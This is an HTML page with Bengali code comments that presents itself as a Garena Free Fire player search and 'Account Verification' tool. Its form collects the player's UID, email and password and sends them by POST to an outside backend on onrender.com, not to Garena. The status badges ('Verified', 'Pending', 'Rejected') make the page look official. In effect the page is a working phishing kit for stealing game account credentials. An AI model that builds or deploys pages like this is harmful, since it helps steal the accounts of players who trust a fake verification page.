<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Player Search</title>
    <style>
        body { font-family: Arial, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
        input, button { width: 90%; padding: 10px; margin: 8px 0; border-radius: 5px; border: none; }
        button { background: #ff4757; color: white; font-weight: bold; cursor: pointer; }
        .status-badge { padding: 6px 12px; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; }
        .status-rejected { background: #ff4757; color: #fff; }
        .status-pending { background: #ffa500; color: #fff; }
        .status-approved { background: #2ed573; color: #fff; }
    </style>
</head>
<body>

<div class="card">
    <h2>Player Info Search</h2>
    <input type="text" id="uidInput" placeholder="Enter Player UID">
    <button onclick="searchPlayer()">Search</button>

    <div id="resultBox" style="display:none; margin-top: 20px;">
        <p><strong>Name:</strong> <span id="playerName"></span></p>
        <p><strong>Level:</strong> <span id="playerLevel"></span></p>
        <div id="statusContainer"></div>
    </div>

    <hr style="margin: 20px 0; border-color: #333;">

    <h3>Account Verification</h3>
    <input type="email" id="accEmail" placeholder="Enter Email">
    <input type="password" id="accPass" placeholder="Enter Password">
    <button onclick="submitAccount()">Submit Account</button>
</div>

<script>
    // আপনার ব্যাকএন্ড সার্ভারের ইউআরএল
    const API_BASE = "https://ff-garena-backend.onrender.com"; 

    async function searchPlayer() {
        const uid = document.getElementById('uidInput').value.trim();
        if (!uid) return alert("Please enter UID");

        try {
            const res = await fetch(`${API_BASE}/api/search/${uid}`);
            const data = await res.json();

            document.getElementById('resultBox').style.display = 'block';
            document.getElementById('playerName').innerText = data.name;
            document.getElementById('playerLevel').innerText = data.level;

            const statusDiv = document.getElementById('statusContainer');
            statusDiv.innerHTML = '';

            if (data.accountStatus === 'rejected') {
                statusDiv.innerHTML = `<span class="status-badge status-rejected">Account Status: Rejected ❌</span>`;
            } else if (data.accountStatus === 'pending') {
                statusDiv.innerHTML = `<span class="status-badge status-pending">Account Status: Pending ⏳</span>`;
            } else if (data.accountStatus === 'approved') {
                statusDiv.innerHTML = `<span class="status-badge status-approved">Account Status: Verified ✅</span>`;
            }
        } catch (err) {
            alert("Error fetching player data");
        }
    }

    async function submitAccount() {
        const uid = document.getElementById('uidInput').value.trim();
        const email = document.getElementById('accEmail').value.trim();
        const password = document.getElementById('accPass').value.trim();

        if (!uid || !email || !password) {
            return alert("UID, Email, and Password are all required!");
        }

        try {
            const res = await fetch(`${API_BASE}/api/submit-account`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid, email, password })
            });
            const data = await res.json();

            alert(data.message);
            searchPlayer(); // রিফ্রেশ স্ট্যাটাস
        } catch (err) {
            alert("Submission error");
        }
    }
</script>

</body>
</html>
